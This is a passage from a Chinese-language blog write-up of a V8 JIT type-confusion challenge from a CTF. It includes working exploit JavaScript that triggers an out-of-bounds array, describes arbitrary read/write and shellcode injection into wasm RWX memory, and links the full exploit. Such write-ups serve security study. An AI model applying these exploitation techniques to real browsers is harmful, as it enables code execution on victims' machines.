class="number">1.6</span>];</span><br><span class="line"><span class="keyword">var</span> OPT_NUM = <span class="number">0x10000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo4vul</span>(<span class="params">a,b,arr,o</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;OPT_NUM;++i)&#123;&#125;</span><br><span class="line">	<span class="keyword">let</span> ret = o.x+arr[<span class="number">4</span>];</span><br><span class="line">	a&amp;b;</span><br><span class="line">	o.l = <span class="number">0x667788</span>;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// trigger vul to get an OOB Array</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger_vul</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">let</span> b0 = &#123;</span><br><span class="line">		valueOf: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">22223333</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">let</span> b = &#123;</span><br><span class="line">		valueOf: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			victim_obj.__defineGetter__(<span class="string">'xx'</span>,()=&gt;<span class="number">2</span>);</span><br><span class="line">			victim_obj.__defineGetter__(<span class="string">'xx'</span>,()=&gt;<span class="number">2</span>);</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">16</span>; i++)&#123;</span><br><span class="line">				<span class="keyword">new</span> <span class="built_in">String</span>();</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">888888889999</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">let</span> arr_t = [<span class="number">1.1</span>,<span class="number">1.2</span>,<span class="number">1.3</span>,<span class="number">1.4</span>,<span class="number">1.5</span>,<span class="number">1.6</span>];</span><br><span class="line">	foo4vul(<span class="number">12345</span>,b0,arr_t,&#123;<span class="attr">x</span>:<span class="number">1</span>,<span class="attr">y</span>:<span class="number">2</span>,<span class="attr">z</span>:<span class="number">3</span>,<span class="attr">l</span>:<span class="number">4</span>,<span class="attr">a</span>:<span class="number">5</span>,<span class="attr">b</span>:<span class="number">6</span>,<span class="attr">c</span>:<span class="number">7</span>,<span class="attr">d</span>:<span class="number">8</span>,<span class="attr">e</span>:<span class="number">9</span>&#125;);</span><br><span class="line">	foo4vul(<span class="number">12345</span>,b0,arr_t,&#123;<span class="attr">x</span>:<span class="number">1</span>,<span class="attr">y</span>:<span class="number">2</span>,<span class="attr">z</span>:<span class="number">3</span>,<span class="attr">l</span>:<span class="number">4</span>,<span class="attr">a</span>:<span class="number">5</span>,<span class="attr">b</span>:<span class="number">6</span>,<span class="attr">c</span>:<span class="number">7</span>,<span class="attr">d</span>:<span class="number">8</span>,<span class="attr">e</span>:<span class="number">9</span>&#125;);</span><br><span class="line">	foo4vul(<span class="number">12345</span>,b,arr,victim_obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">trigger_vul();</span><br></pre></td></tr></table></figure>
<p>后续只需要在申请一个ArrayBuffer、marker，让它也移动到<code>old space</code>，依据特征查找处偏移即可做到任意地址读写，仍然按照上一种利用思路中获取wasm的rwx地址的方式，写入shellcode即可。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0xdead and 0xbeef is special</span></span><br><span class="line">marker = &#123;<span class="attr">a</span>:<span class="number">0xdead</span>,<span class="attr">b</span>:<span class="number">0xbeef</span>,<span class="attr">c</span>:f&#125;;</span><br><span class="line"><span class="comment">// 0x222 is special</span></span><br><span class="line">ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x222</span>);</span><br><span class="line">gc();</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/e3pem/CTF/blob/master/xnuca2019_jit/exp2.js" target="_blank" rel="noopener">完整exp在这里</a></p>
<p>利用效果：</p>
<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/xnuca2019-calc.png" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们通过对源码的分析结合其他题目的利用方式先找到了漏洞的触发方式，然后再从源码的角度详细的跟踪了触发漏洞的回调函数具体调用路径，并且以此找到了3中定义回调函数的方式，分别是：定义toPrimitive属性；定义valueOf；定义toString。利用该漏洞可以造成类型混淆，然后介绍了两种利用方式来对这道题进行利用，分别是：伪造<code>ArrayBuffer map</code>，进一步伪造可用于任意地址读写的<code>ArrayBuffer</code>；将对象从<code>fast mode</code>转变成<code>dictionary mode</code>，然后移至<code>old space</code>，此时对象会发生收缩，但优化代码仍然会按照原来的方式读写对象的属性，也既越界读写其他对象的内容，构造合适的内存排布，越界写<code>JSArray</code>对象的length字段来构造OOB，进而实现任意地址读写。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://p4nda.top/2019/06/11/%C2%96CVE-2018-17463/" target="_blank" rel="noopener">http://p4nda.top/2019/06/11/%C2%96CVE-2018-17463/</a></p>
<p><a href="https://mem2019.github.io/jekyll/update/2019/08/28/V8-Redundancy-Elimination.html" target="_blank" rel="noopener">https://mem2019.github.io/jekyll/update/2019/08/28/V8-Redundancy-Elimination.html</a></p>
<p><a href="http://eternalsakura13.com/2019/04/29/v9/" target="_blank" rel="noopener">http://eternalsakura13.com/2019/04/29/v9/</a></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/browser/" rel="tag"># browser</a>
          
            <a href="/tags/v8/" rel="tag"># v8</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/03/20/IoT/DD-WRT-VirtualBox/" rel="next" title="Run and Debug DD-WRT with VirtualBox">
                <i class="fa fa-chevron-left"></i> Run and Debug DD-WRT with VirtualBox
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">e3pem</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">28</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">3</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">24</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/e3pem" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i></a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:ymyushouxi@163.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i></a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友情链接
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://p4nda.top/" title="P4nda" target="_blank">P4nda</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://sunichi.github.io/" title="Sunichi" target="_blank">Sunichi</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ble55ing.github.io/" title="Ble55ing" target="_blank">Ble55ing</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://p1umer.github.io/" title="P1umer" target="_blank">P1umer</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ama2in9.top/" title="Ama2in9" target="_blank">Ama2in9</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://xiaoxiaorenwu.top/" title="xiaoxiaorenwu" target="_blank">xiaoxiaorenwu</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#patch"><span class="nav-number">2.1.</span> <span class="nav-text">patch</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#寻找漏洞触发点"><span class="nav-number">2.2.</span> <span class="nav-text">寻找漏洞触发点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#探寻回调函数-toPrimitive"><span class="nav-number">2.3.</span> <span class="nav-text">探寻回调函数-toPrimitive</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#探寻回调函数-valueOf"><span class="nav-number">2.4.</span> <span class="nav-text">探寻回调函数-valueOf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#小结"><span class="nav-number">2.5.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用-Fake-ArrayBuffer"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用 - Fake ArrayBuffer</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#addrOf原语"><span class="nav-number">3.1.</span> <span class="nav-text">addrOf原语</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fakeObj原语"><span class="nav-number">3.2.</span> <span class="nav-text">fakeObj原语</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#伪造ArrayBuffer-map"><span class="nav-number">3.3.</span> <span class="nav-text">伪造ArrayBuffer map</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#伪造ArrayBuffer"><span class="nav-number">3.4.</span> <span class="nav-text">伪造ArrayBuffer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell"><span class="nav-number">3.5.</span> <span class="nav-text">getshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用-Shrink-object"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用 - Shrink object</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基础知识"><span class="nav-number">4.1.</span> <span class="nav-text">基础知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实际利用"><span class="nav-number">4.2.</span> <span class="nav-text">实际利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">e3pem</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  




	





  





  












  





  

  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  

  

  

  

</body>
</html>
